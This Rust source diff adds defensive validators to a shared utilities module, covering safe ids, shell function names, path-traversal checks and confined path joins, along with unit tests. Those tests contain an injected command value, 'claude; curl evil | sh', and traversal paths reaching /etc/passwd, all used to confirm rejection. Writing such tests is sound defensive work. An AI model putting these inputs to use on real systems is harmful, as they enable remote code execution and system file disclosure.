@@ -1,5 +1,7 @@
-/// Shared utility functions used across modules.
-///
+//! Shared utility functions used across modules.
+
+use std::path::{Component, Path, PathBuf};
+
 /// Truncate a string to `max` bytes, appending `…` if shortened.
 ///
 /// The cut point is rounded down to a valid char boundary.
@@ -9,6 +11,88 @@ pub fn truncate(s: &str, max: usize) -> String {
     } else {
         format!("{}…", &s[..s.floor_char_boundary(max)])
     }
+}
+
+/// Safe run / event id for use as a filesystem or object key component.
+///
+/// Allows UUID-like and short hex prefixes; rejects empty, separators, and `..`.
+pub fn is_safe_id(id: &str) -> bool {
+    let b = id.as_bytes();
+    if b.is_empty() || b.len() > 128 {
+        return false;
+    }
+    b.iter().all(|c| {
+        c.is_ascii_alphanumeric() || *c == b'-' || *c == b'_'
+    })
+}
+
+/// Shell harness wrap basename: must be a pure function identifier.
+///
+/// Used before writing ambient wrappers into the user's rc file so a
+/// project `config.toml` cannot inject shell metacharacters.
+pub fn is_safe_wrap_name(name: &str) -> bool {
+    let b = name.as_bytes();
+    if b.is_empty() || b.len() > 64 {
+        return false;
+    }
+    // Must start with letter or underscore (valid shell function name).
+    if !(b[0].is_ascii_alphabetic() || b[0] == b'_') {
+        return false;
+    }
+    b.iter()
+        .all(|c| c.is_ascii_alphanumeric() || *c == b'-' || *c == b'_')
+}
+
+/// Reject absolute paths and `..` / prefix components in a relative path string.
+pub fn validate_relative_path(relative: &str) -> anyhow::Result<&Path> {
+    if relative.is_empty() {
+        anyhow::bail!("empty relative path refused");
+    }
+    let p = Path::new(relative);
+    if p.is_absolute() {
+        anyhow::bail!("absolute path refused: {relative}");
+    }
+    for c in p.components() {
+        match c {
+            Component::Normal(os) => {
+                if os.is_empty() {
+                    anyhow::bail!("empty path component refused");
+                }
+            }
+            Component::CurDir => {}
+            Component::ParentDir => anyhow::bail!("parent directory (..) refused: {relative}"),
+            Component::RootDir | Component::Prefix(_) => {
+                anyhow::bail!("absolute/prefix path refused: {relative}");
+            }
+        }
+    }
+    Ok(p)
+}
+
+/// Join `base` / `relative` after validating that `relative` cannot escape `base`.
+pub fn confined_join(base: &Path, relative: &str) -> anyhow::Result<PathBuf> {
+    let rel = validate_relative_path(relative)?;
+    let mut out = base.to_path_buf();
+    for c in rel.components() {
+        if let Component::Normal(part) = c {
+            out.push(part);
+        }
+    }
+    Ok(out)
+}
+
+/// Sync-manifest file entry: must be `runs/<safe-id>.json` only.
+pub fn is_safe_sync_run_file(file: &str) -> bool {
+    let Some(name) = file.strip_prefix("runs/") else {
+        return false;
+    };
+    if name.contains('/') || name.contains('\\') {
+        return false;
+    }
+    let Some(stem) = name.strip_suffix(".json") else {
+        return false;
+    };
+    is_safe_id(stem)
 }
 
 /// HTML-escape the five standard entities.
@@ -93,7 +177,7 @@ pub fn merge_run_notes(existing: Option<String>, parts: &[&str]) -> String {
 
 #[cfg(test)]
 mod notes_tests {
-    use super::merge_run_notes;
+    use super::*;
 
     #[test]
     fn merge_preserves_continuity_and_adapter() {
@@ -114,5 +198,31 @@ mod notes_tests {
         );
         assert_eq!(n.matches("adapter:claude").count(), 1);
         assert!(n.contains("claim:1"));
+    }
+
+    #[test]
+    fn safe_id_and_wrap_name() {
+        assert!(is_safe_id("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"));
+        assert!(is_safe_id("abcd1234"));
+        assert!(!is_safe_id("../evil"));
+        assert!(!is_safe_id("a/b"));
+        assert!(!is_safe_id(""));
+        assert!(is_safe_wrap_name("claude"));
+        assert!(is_safe_wrap_name("my_tool-1"));
+        assert!(!is_safe_wrap_name("claude; curl evil | sh"));
+        assert!(!is_safe_wrap_name("1bad"));
+        assert!(!is_safe_wrap_name(""));
+    }
+
+    #[test]
+    fn confined_join_blocks_escape() {
+        let base = Path::new("/tmp/sync");
+        assert!(confined_join(base, "runs/a.json").is_ok());
+        assert!(confined_join(base, "../etc/passwd").is_err());
+        assert!(confined_join(base, "/etc/passwd").is_err());
+        assert!(is_safe_sync_run_file("runs/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee.json"));
+        assert!(!is_safe_sync_run_file("../../x.json"));
+        assert!(!is_safe_sync_run_file("runs/../x.json"));
+        assert!(!is_safe_sync_run_file("/tmp/x.json"));
     }
 }
